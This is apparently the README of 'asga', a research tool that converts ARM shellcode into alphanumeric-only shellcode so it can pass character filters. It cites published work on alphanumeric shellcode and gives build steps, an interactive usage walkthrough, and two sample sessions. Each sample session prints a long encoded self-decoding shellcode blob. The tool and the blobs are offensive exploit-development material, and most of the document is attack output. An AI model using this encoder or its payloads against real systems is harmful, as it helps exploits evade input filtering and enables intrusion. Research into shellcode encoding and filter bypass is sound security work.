# asga(Alphanumeric Shellcode Generator for ARM targets)
Based on Rix's "Writing ia32 alphanumeric shellcodes", idea of looped decoding from BerendJanWever's "Alpha3", and the Prack article "Alphanumeric RISC ARM Shellcode" by Yves Younan et al

##Build:
cd [project_root]/src  
make

The binary "arm_alnum" would be created in [project_root]/src/  
"arm_alnum" can be moved to any directory of choice.

##Usage:
[Directory_of_arm_alnum]/arm_alnum  
The program asks for the file containing the input shellcode, and the type of file (currently supports only C and binary).  
A binary input file should just contain the shellcode.  
A C input file should have the shellcode in a global char array.  
For a C file as input, the program asks for the name of the global char array containing the input shellcode.  
The program then asks if the target system requires instruction cache flush for self-modifying code. Here the option "can't say" is same as "yes".  
The program then asks for output file name and type, and prints the output shellcode and its length to stdout.  

Examples for [project_root]/test/test.c:  
([project_root] is /home/pratikku/asga)  
  
pratikku@pratikku-ThinkPad-X230:~/asga$ ./src/arm_alnum   
Input file type: C or binary? [C/b]C  
Input C file name: /home/pratikku/asga/test/test.c  
Name of the array containing the shellcode: SC  
Does the target system require instruction cache flush for self-modifying code?[y/n/c(can't say)]y  
Output file type: C or binary? [C/b] C  
Output C file name: /home/pratikku/asga/test/test_out.c  
The alphanumeric shellcode:  
d0QR5pqRPPQRdp5B9piBcPiRfpBR2pdB1P8RsP6RlP4RiPFBw0VRfpvBD02BuP4Rs0VBt0BBrPVREp6BRPARxPdBzp9RgpEB30WRTPcB8pOR0pOB8pWU8pWEdPWBdPWRd0GRz0CRz0CRz0CRr0CRsEOPe0GRbPGRhPDUsEDPdPGRhPDUsEDP7P3RWP5BhPDEdPWBsEDPd0GRVP3RtPER5CDPe0GRoP3RhPDEdPWBsEDPsEDPsEDPsEDPZP7RhPDUsEDPd0GR8P3RGPER5CDPe0GRoP3RhPDEdPWBsEDPsEDPsEDP9P3R2P5BhPDEdPWBsEDPmP3RmP5BhPDEdPWBsEDPrP3RrP5BhPDEdPWBsEDPsEDPsEDPSP7RwP5RhPDUsEDPsEDPsEDPbPGRhPDUsEDPdPGRhPDUsEDPUP3R5P5BhPDEdPWBsEDPkP7RPP5RhPDUdpWR7GGP7gGPtVCPjpMReDGVeAGVeBGVeDGVeYGVeVGVeSGVeUGVeEGVeiGVeiGVeiGVRpMRGA7YtwUP9e7OB04BtpDR7tOP7d4Ps04BD0WU5tGPDXWUcw9PD0FU5dFP5tGP8WyR64oKE5FUZgp5fePPqUkPeQbplOirVuYotoxaPxSvSLVPYoGQkOWAkODqKOTqCuEaKleryXwBdEvGgqIOOpqVSqpFwxuLPycvuHVQYPaVSxwRWtuwEQIOaQQVuXELwvEwFaKodZBiDHwleQtgWqKopsSXREPlPlvMSCSDbOAbRMDzfDtqetbkRqByRLvOBYPrrUUtRpBmptvPtrajpUQDCgpmRmcFrpaGPcAEVTBOCaRlpsDoDzTpgJVPtzPrBOposDVZVOqbpoBOPtgJfOArbIPnDorBrACCphvjFOpebTAsFObPPaacsCQgrDK0  
Shellcode Length: 904  
  
pratikku@pratikku-ThinkPad-X230:~/asga$ ./src/arm_alnum   
Input file type: C or binary? [C/b]C  
Input C file name: /home/pratikku/asga/test/test.c  
Name of the array containing the shellcode: SC  
Does the target system require instruction cache flush for self-modifying code?[y/n/c(can't say)]n  
Output file type: C or binary? [C/b] b  
Output binary file name: /home/pratikku/asga/test/test_out    
The alphanumeric shellcode:  
50XRfP6B5pqRg09Bk0BBp0RRQPuRE07RdpxBU04RlpIBp0aBG0qR4pSRFpABT01RspsRTP7Rr0ABcPsBmPYB1pQRrP1R60vR2PVBwPUB8pOR8pOB8pWU4pWE50WB50WR5PGRzPERZPERZPERucOP6PGR5PGRJ05Rc0CR3eFP6PGRG05R803BZ0FE50WBucFPucFPucFPucFPs0gRZ0FUucFP5PGRV05Re0CR3eFP6PGR505RJ03BZ0FE50WBucFPucFPucFPB05RI03BZ0FE50WBucFPe05Re03BZ0FE50WBucFPI05RI03BZ0FE50WBucFPucFPucFPu0gRZ0FUucFPucFP5pWR7GGP7gGPtVEPnpDR7tOP7d4Pw04BB0WU5tGPBWWUcz8PB0FU5dFP5tGP1LxRAMUKCFFUtEPPAUkPVapPlOYrWeYotoJApxCvsLTpkOEqyodqkOVQIouabewAKlErhHGBveGWWqiOMPpFQQbfFhGlaiCvghgAYPcvPHuruTdggqkopAcvUXELWvVGGqyOtZbiWxWltAEwfaKoPsBHcUBLPlfMbSbTpoCBbMVZGTvQddRkSaCiPlfOPyCBcETdrpPMrTdpGBajseADPWBMpMpvrpBwcSpUvTPoBqpLcCdoUjvPtzDpgJprrOpoRTejvOsBPorOPtVZDoRBqypnFOPbaqPsaxvjdoQuptbCdopppaSCQcCGcTy1  
Shellcode Length: 724  

